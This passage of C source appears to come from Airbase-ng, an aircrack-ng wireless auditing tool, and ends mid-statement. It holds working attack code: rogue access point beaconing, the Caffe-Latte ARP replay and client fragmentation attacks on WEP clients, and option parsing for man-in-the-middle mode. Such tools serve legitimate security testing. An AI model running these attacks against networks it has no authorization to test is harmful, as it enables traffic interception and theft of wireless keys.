            beacon[beacon_len+9] = (apc.interval * MAX(getESSIDcount(), 1) >> 8) & 0xFF;
            memcpy(beacon+beacon_len+10, apc.capa, 2);          //capability
            beacon_len+=12;

            beacon[beacon_len] = 0x00; //essid tag
            beacon[beacon_len+1] = essid_len; //essid tag
            beacon_len+=2;
            memcpy(beacon+beacon_len, essid, essid_len); //actual essid
            beacon_len+=essid_len;

            memcpy(beacon+beacon_len, RATES, sizeof(RATES) -1); //rates
            beacon_len += sizeof(RATES) -1;

            beacon[beacon_len] = 0x03; //channel tag
            beacon[beacon_len+1] = 0x01;
            temp_channel = wi_get_channel(_wi_in); //current channel
			if (!invalid_channel_displayed) {
				if (temp_channel > 255) {
					// Display error message once
					invalid_channel_displayed = 1;
					fprintf(stderr, "Error: Got channel %d, expected a value < 256.\n", temp_channel);
				} else if (temp_channel < 1) {
					invalid_channel_displayed = 1;
					fprintf(stderr, "Error: Got channel %d, expected a value > 0.\n", temp_channel);
				}
			}
            beacon[beacon_len+2] = ((temp_channel > 255 || temp_channel < 1) && opt.channel != 0) ? opt.channel : temp_channel;

            beacon_len+=3;

            if( opt.allwpa )
            {
                memcpy(beacon+beacon_len, ALL_WPA2_TAGS, sizeof(ALL_WPA2_TAGS) -1);
                beacon_len += sizeof(ALL_WPA2_TAGS) -1;
            }
            else if(opt.wpa2type > 0)
            {
                memcpy(beacon+beacon_len, WPA2_TAG, 22);
                beacon[beacon_len+7] = opt.wpa2type;
                beacon[beacon_len+13] = opt.wpa2type;
                beacon_len += 22;
            }

            // Add extended rates
            memcpy(beacon + beacon_len, EXTENDED_RATES, sizeof(EXTENDED_RATES) -1);
            beacon_len += sizeof(EXTENDED_RATES) -1;

            if( opt.allwpa )
            {
                memcpy(beacon+beacon_len, ALL_WPA1_TAGS, sizeof(ALL_WPA1_TAGS) -1);
                beacon_len += sizeof(ALL_WPA1_TAGS) -1;
            }
            else if(opt.wpa1type > 0)
            {
                memcpy(beacon+beacon_len, WPA1_TAG, 24);
                beacon[beacon_len+11] = opt.wpa1type;
                beacon[beacon_len+17] = opt.wpa1type;
                beacon_len += 24;
            }


            //copy timestamp into beacon; a mod 2^64 counter incremented each microsecond
            for(i=0; i<8; i++)
            {
                beacon[24+i] = ( timestamp >> (i*8) ) & 0xFF;
            }

            beacon[22] = (seq << 4) & 0xFF;
            beacon[23] = (seq >> 4) & 0xFF;

            fflush(stdout);

            if( send_packet( beacon, beacon_len ) < 0 )
            {
                printf("Error sending beacon!\n");
                return;
            }

            seq++;
        }
    }
}

void caffelatte_thread( void )
{
    struct timeval tv, tv2;
    float f, ticks[3];
    int arp_off1=0;
    int nb_pkt_sent_1=0;
    int seq=0;

    ticks[0]=0;
    ticks[1]=0;
    ticks[2]=0;

    while( 1 )
    {
        /* sleep until the next clock tick */

        gettimeofday( &tv,  NULL );
        usleep( 1000000/RTC_RESOLUTION );
        gettimeofday( &tv2, NULL );

#if defined(__x86_64__) && defined(__CYGWIN__)
        f = (0.0f + 1000000)
#else
	f = 1000000.0
#endif
		 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                    + (float) ( tv2.tv_usec - tv.tv_usec );

        ticks[0] += f / ( 1000000/RTC_RESOLUTION );
        ticks[1] += f / ( 1000000/RTC_RESOLUTION );
        ticks[2] += f / ( 1000000/RTC_RESOLUTION );

        if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)
#if defined(__x86_64__) && defined(__CYGWIN__)
		(0.0f + 1000)
#else
		1000.0
#endif
		/(double)opt.r_nbpps)*(double)seq )
        {
            /* threshold reach, send one frame */
//            ticks[2] = 0;


            if( opt.nb_arp > 0 )
            {
                if( nb_pkt_sent_1 == 0 )
                    ticks[0] = 0;

                if( send_packet( arp[arp_off1].buf,
                                 arp[arp_off1].len ) < 0 )
                    return;

                nb_pkt_sent_1++;

                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent_1  )
                {
                    if( send_packet( arp[arp_off1].buf,
                                    arp[arp_off1].len ) < 0 )
                        return;

                    nb_pkt_sent_1++;
                }

                if( ++arp_off1 >= opt.nb_arp )
                    arp_off1 = 0;
            }
        }
    }
}

int del_next_CF(pCF_t curCF)
{
    pCF_t tmp;

    if(curCF == NULL)
        return 1;

    if(curCF->next == NULL)
        return 1;

    tmp = curCF->next;
    curCF -> next = tmp->next;

    free(tmp);

    return 0;
}

int cfrag_fuzz(unsigned char *packet, int frags, int frag_num, int length, unsigned char rnd[2])
{
    int z, i;
    unsigned char overlay[4096];
    unsigned char *smac = NULL;

    if(packet == NULL)
        return 1;

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if(length <= z+8)
        return 1;

    if(frags < 1)
        return 1;

    if(frag_num < 0 || frag_num > frags)
        return 1;

    if( (packet[1] & 3) <= 1 )
        smac = packet + 10;
    else if( (packet[1] & 3) == 2 )
        smac = packet + 16;
    else
        smac = packet + 24;

    memset(overlay, 0, 4096);

    smac[4] ^= rnd[0];
    smac[5] ^= rnd[1];

    if(frags == 1 && frag_num == 1) /* ARP final */
    {
        overlay[z+14] = rnd[0];
        overlay[z+15] = rnd[1];
        overlay[z+18] = rnd[0];
        overlay[z+19] = rnd[1];
        add_crc32_plain(overlay+z+4, length-z-4-4);
    }
    else if(frags == 3 && frag_num == 3)/* IP final */
    {
        overlay[z+12] = rnd[0];
        overlay[z+13] = rnd[1];
        overlay[z+16] = rnd[0];
        overlay[z+17] = rnd[1];
        add_crc32_plain(overlay+z+4, length-z-4-4);
    }

    for(i=0; i<length; i++)
    {
        packet[i] ^= overlay[i];
    }

    return 0;
}


void cfrag_thread( void )
{
    struct timeval tv, tv2;
    float f, ticks[3];
    int nb_pkt_sent_1=0;
    int seq=0, i=0;
    pCF_t   curCF;
    unsigned char rnd[2];
    unsigned char buffer[4096];

    ticks[0]=0;
    ticks[1]=0;
    ticks[2]=0;

    while( 1 )
    {
        /* sleep until the next clock tick */

        gettimeofday( &tv,  NULL );
        usleep( 1000000/RTC_RESOLUTION );
        gettimeofday( &tv2, NULL );

#if defined(__x86_64__) && defined(__CYGWIN__)
        f = (0.0f + 1000000)
#else
	f = 1000000.0
#endif
		* (float) ( tv2.tv_sec  - tv.tv_sec  )
                    + (float) ( tv2.tv_usec - tv.tv_usec );

        ticks[0] += f / ( 1000000/RTC_RESOLUTION );
        ticks[1] += f / ( 1000000/RTC_RESOLUTION );
        ticks[2] += f / ( 1000000/RTC_RESOLUTION );

        if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)
#if defined(__x86_64__) && defined(__CYGWIN__)
		(0.0f + 1000)
#else
		1000.0
#endif
		/(double)opt.r_nbpps)*(double)seq )
        {
            /* threshold reach, send one frame */
//            ticks[2] = 0;

            pthread_mutex_lock( &mx_cf );

            if( opt.cf_count > 0 )
            {
                curCF = rCF;

                if(curCF->next == NULL)
                {
                    opt.cf_count = 0;
                    pthread_mutex_unlock( &mx_cf );
                    continue;
                }

                while( curCF->next != NULL && curCF->next->xmitcount >= MAX_CF_XMIT )
                {
                    del_next_CF(curCF);
                }

                if(curCF->next == NULL)
                {
                    opt.cf_count = 0;
                    pthread_mutex_unlock( &mx_cf );
                    continue;
                }

                curCF = curCF->next;

                if( nb_pkt_sent_1 == 0 )
                    ticks[0] = 0;

                rnd[0] = rand() % 0xFF;
                rnd[1] = rand() % 0xFF;

                for(i=0; i<curCF->fragnum; i++ )
                {
                    memcpy(buffer, curCF->frags[i], curCF->fraglen[i]);
                    cfrag_fuzz(buffer, curCF->fragnum, i, curCF->fraglen[i], rnd);
                    if( send_packet( buffer, curCF->fraglen[i] ) < 0 )
                    {
                        pthread_mutex_unlock( &mx_cf );
                        return;
                    }
                }
                memcpy(buffer, curCF->final, curCF->finallen);
                cfrag_fuzz(buffer, curCF->fragnum, curCF->fragnum, curCF->finallen, rnd);
                if( send_packet( buffer, curCF->finallen ) < 0 )
                {
                    pthread_mutex_unlock( &mx_cf );
                    return;
                }

                curCF->xmitcount++;
                nb_pkt_sent_1++;

                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent_1  )
                {
                    rnd[0] = rand() % 0xFF;
                    rnd[1] = rand() % 0xFF;
                    for(i=0; i<curCF->fragnum; i++ )
                    {
                        memcpy(buffer, curCF->frags[i], curCF->fraglen[i]);
                        cfrag_fuzz(buffer, curCF->fragnum, i, curCF->fraglen[i], rnd);
                        if( send_packet( buffer, curCF->fraglen[i] ) < 0 )
                        {
                            pthread_mutex_unlock( &mx_cf );
                            return;
                        }
                    }
                    memcpy(buffer, curCF->final, curCF->finallen);
                    cfrag_fuzz(buffer, curCF->fragnum, curCF->fragnum, curCF->finallen, rnd);
                    if( send_packet( buffer, curCF->finallen ) < 0 )
                    {
                        pthread_mutex_unlock( &mx_cf );
                        return;
                    }

                    curCF->xmitcount++;
                    nb_pkt_sent_1++;
                }
            }
            pthread_mutex_unlock( &mx_cf );
        }
    }
}

int main( int argc, char *argv[] )
{
    int ret_val, len, i, n;
    struct pcap_pkthdr pkh;
    fd_set read_fds;
    unsigned char buffer[4096];
    char *s, buf[128];
    int caplen;
    struct AP_conf apc;
    unsigned char mac[6];

    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );
    memset( &dev, 0, sizeof( dev ) );
    memset( &apc, 0, sizeof( struct AP_conf ));

    pthread_mutex_init(&rESSIDmutex, NULL);
    rESSID = (pESSID_t) malloc(sizeof(struct ESSID_list));
    memset(rESSID, 0, sizeof(struct ESSID_list));

    rFragment = (pFrag_t) malloc(sizeof(struct Fragment_list));
    memset(rFragment, 0, sizeof(struct Fragment_list));

    rClient = (pMAC_t) malloc(sizeof(struct MAC_list));
    memset(rClient, 0, sizeof(struct MAC_list));

    rBSSID = (pMAC_t) malloc(sizeof(struct MAC_list));
    memset(rBSSID, 0, sizeof(struct MAC_list));

    rCF = (pCF_t) malloc(sizeof(struct CF_packet));
    memset(rCF, 0, sizeof(struct CF_packet));

#ifdef USE_GCRYPT
    // Register callback functions to ensure proper locking in the sensitive parts of libgcrypt < 1.6.0
    #if GCRYPT_VERSION_NUMBER < 0x010600
        gcry_control (GCRYCTL_SET_THREAD_CBS, &gcry_threads_pthread);
    #endif
    // Disable secure memory.
    gcry_control (GCRYCTL_DISABLE_SECMEM, 0);
    // Tell Libgcrypt that initialization has completed.
    gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);
#endif
    pthread_mutex_init( &mx_cf, NULL );
    pthread_mutex_init( &mx_cap, NULL );

    opt.r_nbpps     = 100;
    opt.tods        = 0;
    opt.setWEP      = -1;
    opt.skalen      = 128;
    opt.filter      = -1;
    opt.ringbuffer  = 10;
    opt.nb_arp      = 0;
    opt.f_index     = 1;
    opt.interval    = 0x64;
    opt.channel		= 0;
    opt.beacon_cache = 0; /* disable by default */
    opt.use_fixed_nonce = 0;
    opt.ti_mtu = TI_MTU;
    opt.wif_mtu = WIF_MTU;
    invalid_channel_displayed = 0;

    srand( time( NULL ) );

    while( 1 )
    {
        int option_index = 0;

        static struct option long_options[] = {
            {"beacon-cache",1, 0, 'C'},
            {"bssid",       1, 0, 'b'},
            {"bssids",      1, 0, 'B'},
            {"channel",     1, 0, 'c'},
            {"client",      1, 0, 'd'},
            {"clients",     1, 0, 'D'},
            {"essid",       1, 0, 'e'},
            {"essids",      1, 0, 'E'},
            {"promiscuous", 0, 0, 'P'},
            {"interval",    1, 0, 'I'},
            {"mitm",        0, 0, 'M'},
            {"hidden",      0, 0, 'X'},
            {"caffe-latte", 0, 0, 'L'},
            {"cfrag",       0, 0, 'N'},
            {"verbose",     0, 0, 'v'},
            {"ad-hoc",      0, 0, 'A'},
            {"help",        0, 0, 'H'},
            {0,             0, 0,  0 }
        };

        int option = getopt_long( argc, argv,
                        "a:h:i:C:I:r:w:HPe:E:c:d:D:f:W:qMY:b:B:XsS:Lx:vAz:Z:yV:0NF:n:",
                        long_options, &option_index );

        if( option < 0 ) break;

        switch( option )
        {
            case 0 :

                break;

            case ':' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case '?' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case 'n' :

		// Check the value is 32 bytes, in hex (64 hex)
		if (hexStringToArray(optarg, strlen(optarg), opt.fixed_nonce, 32) != 32) {
			printf("Invalid fixed nonce. It must be 64 hexadecimal chars.\n");
			printf("\"%s --help\" for help.\n", argv[0]);
			return( 1 );
		}
		opt.use_fixed_nonce = 1;
		break;

            case 'a' :

                if( getmac( optarg, 1, opt.r_bssid ) != 0 )
                {
                    printf( "Invalid AP MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'c' :

                opt.channel = atoi(optarg);
                if (opt.channel > 255 || opt.channel < 1)
                {
                	printf("Invalid channel value <%d>. It must be between 1 and 255.\n", opt.channel);
                	return( 1 );
                }

                break;

            case 'V' :

                opt.sendeapol = atoi(optarg);
                if(opt.sendeapol < 1 || opt.sendeapol > 3)
                {
                    printf( "EAPOL value can only be 1[MD5], 2[SHA1] or 3[auto].\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 'v' :

                opt.verbose = 1;
                if( opt.quiet != 0 )
                {
                    printf( "Don't specify -v and -q at the same time.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 'z' :

                opt.wpa1type = atoi(optarg);
                if( opt.wpa1type < 1 || opt.wpa1type > 5 )
                {
                    printf( "Invalid WPA1 type [1-5]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                if (opt.setWEP == -1)
                {
					opt.setWEP = 1;
				}

                break;

            case 'Z' :

                opt.wpa2type = atoi(optarg);
                if( opt.wpa2type < 1 || opt.wpa2type > 5 )
                {
                    printf( "Invalid WPA2 type [1-5]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

				if (opt.setWEP == -1)
                {
					opt.setWEP = 1;
				}

                break;

            case 'e' :

                if( addESSID(optarg, strlen(optarg), 0) != 0 )
                {
                    printf( "Invalid ESSID, too long\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                opt.f_essid = 1;

                break;

            case 'E' :

                if( addESSIDfile(optarg) != 0 )
                    return( 1 );

                opt.f_essid = 1;

                break;

            case 'P' :

                opt.promiscuous = 1;

                break;

            case 'I' :

                opt.interval = atoi(optarg);

                break;

            case 'C' :

                opt.beacon_cache = atoi(optarg);

                break;

            case 'A' :

                opt.adhoc = 1;

                break;

            case 'N' :

                opt.cf_attack = 1;

                break;

            case 'X' :

                opt.hidden = 1;

                break;

            case '0' :

                opt.allwpa = 1;
                if(opt.sendeapol == 0)
                    opt.sendeapol = 3;

                break;

            case 'x' :

                opt.r_nbpps = atoi(optarg);
                if(opt.r_nbpps < 1 || opt.r_nbpps > 1000)
                {
                    printf( "Invalid speed. [1-1000]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 's' :

                opt.forceska = 1;

                break;

            case 'f' :

                if( strncasecmp(optarg, "allow", 5) == 0 || strncmp(optarg, "0", 1) == 0 )
                {
                    opt.filter = ALLOW_MACS; //block all, allow the specified macs
                }
                else if( strncasecmp(optarg, "disallow", 5) == 0 || strncmp(optarg, "1", 1) == 0 )
                {
                    opt.filter = BLOCK_MACS; //allow all, block the specified macs
                }
                else
                {
                    printf( "Invalid macfilter mode. [allow|disallow]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 'S' :

                if(atoi(optarg) < 16 || atoi(optarg) > 1480)
                {
                    printf( "Invalid challenge length. [16-1480]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                opt.skalen = atoi(optarg);

                break;

            case 'h' :

                if( getmac( optarg, 1, opt.r_smac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'i' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.s_face = optarg;
                break;

            case 'W' :

                if(atoi(optarg) < 0 || atoi(optarg) > 1)
                {
                    printf( "Invalid argument for (-W). Only \"0\" and \"1\" allowed.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                opt.setWEP = atoi(optarg);

                break;

            case 'M' :

                opt.mitm = 1;

                break;

            case 'L' :

                opt.caffelatte = 1;

                break;

            case 'y' :

                opt.nobroadprobe = 1;

                break;

            case 'Y' :

                if( strncasecmp(optarg, "in", 2) == 0 )
                {
                    opt.external |= EXT_IN; //process incoming frames
                }
                else if( strncasecmp(optarg, "out", 3) == 0)
                {
                    opt.external |= EXT_OUT; //process outgoing frames
                }
                else if( strncasecmp(optarg, "both", 4) == 0 || strncasecmp(optarg, "all", 3) == 0)
                {
                    opt.external |= EXT_IN | EXT_OUT; //process both directions
                }
                else
                {
                    printf( "Invalid processing mode. [in|out|both]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 'q' :

                opt.quiet = 1;
                if( opt.verbose != 0 )
                {
                    printf( "Don't specify -v and -q at the same time.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                break;

            case 'w' :

                if( opt.prga != NULL )
                {
                    printf( "PRGA file already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                if( opt.crypt != CRYPT_NONE )
                {
                    printf( "Encryption key already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                opt.crypt = CRYPT_WEP;

                i = 0;
                s = optarg;

                buf[0] = s[0];
                buf[1] = s[1];
                buf[2] = '\0';

                while( sscanf( buf, "%x", &n ) == 1 )
                {
                    if( n < 0 || n > 255 )
                    {
                        printf( "Invalid WEP key.\n" );
                        printf("\"%s --help\" for help.\n", argv[0]);
                        return( 1 );
                    }

                    opt.wepkey[i++] = n;

                    if( i >= 64 ) break;

                    s += 2;

                    if( s[0] == ':' || s[0] == '-' )
                        s++;

                    if( s[0] == '\0' || s[1] == '\0' )
                        break;

                    buf[0] = s[0];
                    buf[1] = s[1];
                }

                if( i != 5 && i != 13 && i != 16 && i != 29 && i != 61 )
                {
                    printf( "Invalid WEP key length.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                opt.weplen = i;

                break;

            case 'F':

                if (opt.dump_prefix != NULL) {
                    printf( "Notice: dump prefix already given\n" );
                    break;
                }
                /* Write prefix */
                opt.dump_prefix   = optarg;
                opt.record_data = 1;
                break;

            case 'd':

                if(getmac(optarg, 1, mac) == 0)
                {
                    addMAC(rClient, mac);
                }
                else
                {
                    printf( "Invalid source MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                if(opt.filter == -1) opt.filter = ALLOW_MACS;

                break;

            case 'D':

                if(addMACfile(rClient, optarg) != 0)
                    return( 1 );

                if(opt.filter == -1) opt.filter = ALLOW_MACS;

                break;

            case 'b':

                if(getmac(optarg, 1, mac) == 0)
                {
                    addMAC(rBSSID, mac);
                }
                else
                {
                    printf( "Invalid BSSID address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }

                if(opt.filter == -1) opt.filter = ALLOW_MACS;

                break;

            case 'B':

                if(addMACfile(rBSSID, optarg) != 0)
                    return( 1 );

                if(opt.filter == -1) opt.filter = ALLOW_MACS;

                break;

            case 'r' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.s_file = optarg;
                break;

            case 'H' :

                printf( usage, getVersion("Airbase-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
                return( 1 );

            default : goto usage;
        }
    }

    if( argc - optind != 1 )
    {
        if(argc == 1)
        {
usage:
            printf( usage, getVersion("Airbase-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
        }
        if( argc - optind == 0)
        {
            printf("No replay interface specified.\n");
        }
        if(argc > 1)
        {
            printf("\"%s --help\" for help.\n", argv[0]);
        }
        return( 1 );
    }

    if( ( memcmp(opt.f_netmask, NULL_MAC, 6) != 0 ) && ( memcmp(opt.f_bssid, NULL_MAC, 6) == 0 ) )
    {
        printf("Notice: specify bssid \"--bssid\" with \"--netmask\"\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    if( opt.mitm && (getMACcount(rBSSID) != 1 || getMACcount(rClient) < 1) )
    {
        printf("Notice: You need to specify exactly one BSSID (-b)"
               " and at least one client MAC (-d)\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    if( opt.wpa1type && opt.wpa2type )
    {
        printf("Notice: You can only set one method: WPA (-z) or WPA2 (-Z)\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

//     if( opt.sendeapol && !opt.wpa1type && !opt.wpa2type )
//     {
//         printf("Notice: You need to specify which WPA method to use"
//                " together with EAPOL. WPA (-z) or WPA2 (-Z)\n");
//         printf("\"%s --help\" for help.\n", argv[0]);
//         return( 1 );
//     }

    if( opt.allwpa && (opt.wpa1type || opt.wpa2type) )
    {
        printf("Notice: You cannot use all WPA tags (-0)"
               " together with WPA (-z) or WPA2 (-Z)\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    dev.fd_rtc = -1;

    /* open the RTC device if necessary */

#if defined(__i386__)
#if defined(linux)
    if( 1 )
    {
        if( ( dev.fd_rtc = open( "/dev/rtc0", O_RDONLY ) ) < 0 )
        {
            dev.fd_rtc = 0;
        }

        if( (dev.fd_rtc == 0) && ( dev.fd_rtc = open( "/dev/rtc", O_RDONLY ) ) < 0 )
        {
            dev.fd_rtc = 0;
        }

        if( dev.fd_rtc > 0 )
        {
            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION ) < 0 )
            {
                perror( "ioctl(RTC_IRQP_SET) failed" );
                printf(
"Make sure enhanced rtc device support is enabled in the kernel (module\n"
"rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\n" );
                close( dev.fd_rtc );
                dev.fd_rtc = -1;
            }
            else
            {
                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )
                {
                    perror( "ioctl(RTC_PIE_ON) failed" );
                    close( dev.fd_rtc );
                    dev.fd_rtc = -1;
                }
            }
        }
        else
        {
            printf( "For information, no action required:"
                    " Using gettimeofday() instead of /dev/rtc\n" );
            dev.fd_rtc = -1;
        }
    }
#endif /* linux */
#endif /* __i386__ */

    /* open the replay interface */
    _wi_out = wi_open(argv[optind]);
    if (!_wi_out)
        return 1;
    dev.fd_out = wi_fd(_wi_out);

    /* open the packet source */
    if( opt.s_face != NULL )
    {
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
    }
    else
    {
        _wi_in = _wi_out;
        dev.fd_in = dev.fd_out;
    }

    /* drop privileges */
	if (setuid( getuid() ) == -1) {
		perror("setuid");
	}

    /* XXX */
    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }

    if (opt.record_data)
        if( dump_initialize( opt.dump_prefix ) )
            return( 1 );

    if( opt.s_file != NULL )
    {
        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
        {
            perror( "open failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )
        {
            perror( "fread(pcap file header) failed" );
            return( 1 );
        }

        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
            dev.pfh_in.magic != TCPDUMP_CIGAM )
        {
            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
                             "TCPDUMP_MAGIC).\n", opt.s_file );
            return( 1 );
        }

        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
            SWAP32(dev.pfh_in.linktype);

        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&
            dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&
            dev.pfh_in.linktype != LINKTYPE_PPI_HDR )
        {
            fprintf( stderr, "Wrong linktype from pcap file header "
                             "(expected LINKTYPE_IEEE802_11) -\n"
                             "this doesn't look like a regular 802.11 "
                             "capture.\n" );
            return( 1 );
        }
    }

    dev.dv_ti = ti_open(NULL);
    if(!dev.dv_ti)
    {
        printf( "error opening tap device: %s\n", strerror( errno ) );
        return -1;
    }

    if(!opt.quiet)
    {
        PCT; printf( "Created tap interface %s\n", ti_name(dev.dv_ti));
    }

    //Set MTU on tun/tap interface to a preferred value
    if(!opt.quiet)
    {
        PCT; printf( "Trying to set MTU on %s to %i\n", ti_name(dev.dv_ti), opt.ti_mtu);
    }
    if( ti_set_mtu(dev.dv_ti, opt.ti_mtu) != 0)
    {
        if(!opt.quiet)
        {
            printf( "error setting MTU on %s\n", ti_name(dev.dv_ti));
        }
            opt.ti_mtu = ti_get_mtu(dev.dv_ti);
            if(!opt.quiet)
            {
                PCT; printf( "MTU on %s remains at %i\n", ti_name(dev.dv_ti), opt.ti_mtu);
            }
    }

    //Set MTU on wireless interface to a preferred value
    if( wi_get_mtu(_wi_out) < opt.wif_mtu )
    {
        if(!opt.quiet)
        {
            PCT; printf( "Trying to set MTU on %s to %i\n", _wi_out->wi_interface, opt.wif_mtu);
        }
        if( wi_set_mtu(_wi_out, opt.wif_mtu) != 0 )
        {
            opt.wif_mtu = wi_get_mtu(_wi_out);
            if(!opt.quiet)
            {
                printf( "error setting MTU on %s\n", _wi_out->wi_interface);
                PCT; printf( "MTU on %s remains at %i\n", _wi_out->wi_interface, opt.wif_mtu);
            }
        }
    }

    if(opt.external)
    {
        dev.dv_ti2 = ti_open(NULL);
        if(!dev.dv_ti2)
        {
            printf( "error opening tap device: %s\n", strerror( errno ) );
            return -1;
        }
        if(!opt.quiet)
        {
            PCT;
            printf( "Created tap interface %s for external processing.\n", ti_name(dev.dv_ti2));
            printf( "You need to get the interfaces up, read the fames [,modify]\n");
            printf( "and send them back through the same interface \"%s\".\n", ti_name(dev.dv_ti2));
        }
    }

    if(opt.channel > 0)
        wi_set_channel(_wi_out, opt.channel);

    if( memcmp( opt.r_bssid, NULL_MAC, 6) == 0 && !opt.adhoc)
    {
        wi_get_mac( _wi_out, opt.r_bssid);
    }

    if( memcmp( opt.r_smac, NULL_MAC, 6) == 0 )
    {
        wi_get_mac( _wi_out, opt.r_smac);
    }

    if(opt.adhoc)
    {
        for(i=0; i<6; i++) //random cell
            opt.r_bssid[i] = rand() & 0xFF;

        //generate an even first byte
        if(opt.r_bssid[0] & 0x01)
            opt.r_bssid[0] ^= 0x01;
    }

    memcpy(apc.bssid, opt.r_bssid, 6);
    if( getESSIDcount() == 1 && opt.hidden != 1)
    {
        apc.essid = (char*) malloc(MAX_IE_ELEMENT_SIZE+1);
        apc.essid_len = getESSID(apc.essid);
        apc.essid = (char*) realloc((void *)apc.essid, apc.essid_len + 1);
        apc.essid[apc.essid_len] = 0x00;
    }
    else
    {
        apc.essid = "\x00";
        apc.essid_len = 1;
    }
    apc.interval = opt.interval;
    apc.capa[0] = 0x00;
    if(opt.adhoc)
        apc.capa[0] |= 0x02;
    else
        apc.capa[0] |= 0x01;
    if( (opt.crypt == CRYPT_WEP && opt.setWEP == -1) || opt.setWEP == 1 )
        apc.capa[0] |= 0x10;
    apc.capa[1] = 0x04;

    if(ti_set_mac(dev.dv_ti, opt.r_bssid) != 0)
    {
        printf("\n");
        perror("ti_set_mac failed");
        printf("You most probably want to set the MAC of your TAP interface.\n");
        printf("ifconfig <iface> hw ether %02X:%02X:%02X:%02X:%02X:%02X\n\n\n",
                opt.r_bssid[0], opt.r_bssid[1], opt.r_bssid[2],
                opt.r_bssid[3], opt.r_bssid[4], opt.r_bssid[5]);
    }

    if(opt.external)
    {
        if(ti_set_mac(dev.dv_ti2, (unsigned char*)"\xba\x98\x76\x54\x32\x10") != 0)
        {
            printf("Couldn't set MAC on interface \"%s\".\n", ti_name(dev.dv_ti2));
        }
    }
    //start sending beacons
    if( pthread_create( &(beaconpid), NULL, (void *) beacon_thread,
            (void *) &apc ) != 0 )
    {
        perror("Beacons pthread_create");
        return( 1 );
    }

    if( opt.caffelatte )
    {
        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );

        if( pthread_create( &(caffelattepid), NULL, (void *) caffelatte_thread, NULL ) != 0 )
        {
            perror("Caffe-Latte pthread_create");
            return( 1 );
        }
    }

    if( opt.cf_attack )
    {
        if( pthread_create( &(cfragpid), NULL, (void *) cfrag_thread, NULL ) != 0 )
        {
            perror("cfrag pthread_create");
            return( 1 );
        }
    }

    if( !opt.quiet )
    {
        if(opt.adhoc)
        {
            PCT; printf("Sending beacons in Ad-Hoc mode for Cell %02X:%02X:%02X:%02X:%02X:%02X.\n",
                        opt.r_bssid[0],opt.r_bssid[1],opt.r_bssid[2],opt.r_bssid[3],opt.r_bssid[4],opt.r_bssid[5]);
        }
        else
        {
            PCT; printf("Access Point with BSSID %02X:%02X:%02X:%02X:%02X:%02X started.\n",
